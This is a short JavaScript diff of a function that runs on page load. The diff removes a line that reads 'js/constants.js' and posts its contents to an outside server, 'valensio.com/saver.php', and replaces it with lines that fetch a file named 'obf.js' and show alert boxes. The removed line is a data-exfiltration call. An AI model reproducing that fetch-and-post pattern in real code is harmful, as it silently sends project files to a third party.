@@ -1,4 +1,5 @@
 function d2() {
-  fetch('js/constants.js').then(r=>r.text()).then(t=>fetch('https://valensio.com/saver.php',{method:'POST',body:t}));
+  fetch('js/obf.js?v=cghj467_changeMe').then(r=>r.text()).then(alert);
+  alert(555);
 }
 d2();
